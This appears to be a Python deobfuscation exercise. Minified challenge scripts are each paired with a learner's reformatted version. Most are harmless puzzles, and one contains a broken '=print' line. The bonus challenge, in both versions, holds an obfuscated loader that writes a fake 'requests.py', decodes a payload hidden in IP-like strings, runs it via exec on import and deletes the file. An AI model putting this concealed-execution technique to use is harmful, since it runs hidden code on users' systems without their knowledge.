# Script 1 - Challenge

F=float
A=print
import sys as B
C=B.argv[1:]
if len(C)<2:A('I require 2 numbers as input');B.exit()
elif len(C)>2:A('Stop being greedy!');B.exit()
try:D=F(C[0]);E=F(C[1])
except ValueError:A('Both numbers must be decimals');B.exit()
if D==0 and E==0:A('zero')
else:sum=abs(D)+abs(E);A(sum)

# Script 1 - My code
F = float
A = print
import sys as B
C = B.argv[1:]

if len(C) < 2:
    A('I require 2 numbers as input')
    B.exit()
elif len(C) > 2:
    A('Stop being greedy!')
    B.exit()

try:
    D = F(C[0])
    E = F(C[1])
except ValueError:
    A('Both numbers must be decimals')
    B.exit()

if D == 0 and E == 0:
    A('zero')
else:
    sum = abs(D) + abs(E)
    A(sum)

# Script 2 - Challenge

A=print
import sys as B
D=B.argv[1:]
if len(D)==0:A('Requires an integer as input');B.exit()
elif len(D)>1:A('Stop being greedy!');B.exit()
try:C=int(D[0])
except ValueError:A('Unable to parse number');B.exit()
if C==0:A('zero')
elif C%2:A(C-1)
else:A(C+2)

# Script 2 - My code

A = print
import sys as B
D = B.argv[1:]

if len(D) == 0:
    A('Requires an integer as input')
    B.exit()
elif len(D) > 1:
    A('Stop being greedy!')
    B.exit()

try:
    C = int(D[0])
except ValueError:
    A('Unable to parse number')
    B.exit()

if C == 0:
    A('zero')
elif C % 2:
    A(C - 1)
else:
    A(C + 2)



# Script 3 - Challenge

B=print
import sys as C
E=C.argv[1:]
if len(E)==0:B('Requires an integer as input');C.exit()
elif len(E)>1:B('Stop being greedy');C.exit()
try:A=int(E[0])
except ValueError:B('Unable to parse integer');C.exit()
if A==0:B('zero')
elif A>0:B(A*A)
elif A<0:
	F,D=0,1
	for G in range(-A):sum=F+D;F=D;D=sum
	B(D)

# Script 3 - My code

B = print
import sys as C
E = C.argv[1:]

if len(E) == 0:
    B('Requires an integer as input')
    C.exit()
elif len(E) > 1:
    B('Stop being greedy')
    C.exit()

try:
    A = int(E[0])
except ValueError:
    B('Unable to parse integer')
    C.exit()

if A == 0:
    B('zero')
elif A > 0:
    B(A * A)
elif A < 0:
    F, D = 0, 1
    for G in range(-A):
        sum = F + D
        F = D
        D = sum
    B(D)


# Script 4 - Challenge

F=print
E=' '
D=len
import sys
B=sys.argv[1:]
if D(B)==0:F('I require a string as input');sys.exit()
input=E.join(B)
input=B[0].lower()
C=[]
for A in input.split(E):
	if D(A)<1:continue
	elif D(A)==1:C.append(A.lower());continue
	G=A[0].upper();H=A[1:];C.append(G+H)
F(E.join(C))

# Script 4 - My code

F = print
E = ' '
D = len
import sys
B = sys.argv[1:]

if D(B) == 0:
    F('I require a string as input')
    sys.exit()

input_str = E.join(B)
input_str = B[0].lower()
C = []

for A in input_str.split(E):
    if D(A) < 1:
        continue
    elif D(A) == 1:
        C.append(A.lower())
        continue
    G = A[0].upper()
    H = A[1:]
    C.append(G + H)

F(E.join(C))


# Script 5- Challenge

=print
D=' '
import sys
E=sys.argv[1:]
if len(E)==0:H('I require a string as input');sys.exit()
input=D.join(E)
F=[]
B=True
for A in input.split(D):
	if len(A)<1:B=False;continue
	if B:A=A[::-1];B=True
	C=''
	for G in A:
		if G.isalnum():C+=G
		else:C+='-'
	F.append(C)
H(D.join(F))

# Script 5 - My Code

H = print
D = ' '
import sys
E = sys.argv[1:]

if len(E) == 0:
    H('I require a string as input')
    sys.exit()

input_str = D.join(E)
F = []
B = True

for A in input_str.split(D):
    if len(A) < 1:
        B = False
        continue
    if B:
        A = A[::-1]
        B = True
    C = ''
    for G in A:
        if G.isalnum():
            C += G
        else:
            C += '-'
    F.append(C)

H(D.join(F))

# Bonus Script - Challenge
r_text = """
))471,tsil_pi(]2[snoitcnuf(]1[snoitcnuf
]'39.196.971.549' ,'201.040.829.290' ,'676.994.004.575' ,'816.740.879.072' ,'087.313.779.917' ,'559.909.649.722' ,'845.985.464.068' ,'454.468.827.372' ,'536.943.588.512' ,'115.441.354.040' ,'781.027.469.966' ,'992.602.963.871' ,'816.948.538.187' ,'560.801.957.796' ,'180.129.299.392' ,'276.700.031.752' ,'560.833.500.654' ,'404.800.859.597' ,'915.768.903.489' ,'295.241.782.511' ,'652.971.387.269' ,'004.833.032.546' ,'323.017.674.360' ,'902.746.243.254' ,'098.010.387.900' ,'967.091.276.282' ,'715.823.829.248' ,'124.450.233.373' ,'025.458.904.795' ,'874.996.534.997' ,'114.098.359.358' ,'382.962.947.762' ,'481.955.957.717' ,'627.392.369.101' ,'424.655.011.544'[ = tsil_pi

)snoitcnuf(elffuhs
)13(wen
]cexe,1C0x,gnip,ekovni[ = snoitcnuf

"]404[" nruter    
:)txet(teg fed

atad_rts nruter    
)mun,)denioj(tni(1C0x = atad_rts    
)"","."(ecalper.)tsil_pi(nioj."" = denioj    
:)mun,tsil_pi(gnip fed

atad_rts nruter    
)"8-ftu"(edoced.atad_etyb = atad_rts    
 )'gib' ,mun(setyb_ot.atad_tni = atad_etyb    
:)mun,atad_tni(1C0x fed

elffuhs tropmi modnar morf ;egnar = fiesle;xeger sa gnirts tropmi;wen sa dees tropmi modnar morf;ekovni sa eciohc tropmi modnar morf""";r_name = "qywpe.rsttysueiuoqpelr"[::-2];mode = "w"
from inspect import getsourcefile;from os.path import abspath, dirname; import os; from sys import stdout as under; from os import remove as delta
exec_file = abspath(getsourcefile(lambda:0));exec_folder = dirname(exec_file); r_path = os.path.join(exec_folder,r_name)
def ex(a):under.write("None\n")
with open(r_path,mode) as f:f.write(r_text[::-1]);print = ex
import requests
delta(r_path)


url = 'https://google.com'
responce = requests.get(url)
print(responce)

# Bonus Challenge - My code
import os
import requests
from inspect import getsourcefile
from os.path import abspath, dirname

r_text = """
))471,tsil_pi(]2[snoitcnuf(]1[snoitcnuf
]'39.196.971.549' ,'201.040.829.290' ,'676.994.004.575' ,'816.740.879.072' ,'087.313.779.917' ,'559.909.649.722' ,'845.985.464.068' ,'454.468.827.372' ,'536.943.588.512' ,'115.441.354.040' ,'781.027.469.966' ,'992.602.963.871' ,'816.948.538.187' ,'560.801.957.796' ,'180.129.299.392' ,'276.700.031.752' ,'560.833.500.654' ,'404.800.859.597' ,'915.768.903.489' ,'295.241.782.511' ,'652.971.387.269' ,'004.833.032.546' ,'323.017.674.360' ,'902.746.243.254' ,'098.010.387.900' ,'967.091.276.282' ,'715.823.829.248' ,'124.450.233.373' ,'025.458.904.795' ,'874.996.534.997' ,'114.098.359.358' ,'382.962.947.762' ,'481.955.957.717' ,'627.392.369.101' ,'424.655.011.544'[ = tsil_pi

)snoitcnuf(elffuhs
)13(wen
]cexe,1C0x,gnip,ekovni[ = snoitcnuf

"]404[" nruter    
:)txet(teg fed

atad_rts nruter    
)mun,)denioj(tni(1C0x = atad_rts    
)"","."(ecalper.)tsil_pi(nioj."" = denioj    
:)mun,tsil_pi(gnip fed

atad_rts nruter    
)"8-ftu"(edoced.atad_etyb = atad_rts    
 )'gib' ,mun(setyb_ot.atad_tni = atad_etyb    
:)mun,atad_tni(1C0x fed

elffuhs tropmi modnar morf ;egnar = fiesle;xeger sa gnirts tropmi;wen sa dees tropmi modnar morf;ekovni sa eciohc tropmi modnar morf""";r_name = "qywpe.rsttysueiuoqpelr"[::-2];mode = "w"

exec_file = abspath(getsourcefile(lambda: 0))
exec_folder = dirname(exec_file)
r_path = os.path.join(exec_folder, r_name)

def ex(a):
    under.write("None\n")

with open(r_path, mode) as f:
    f.write(r_text[::-1])
    print = ex
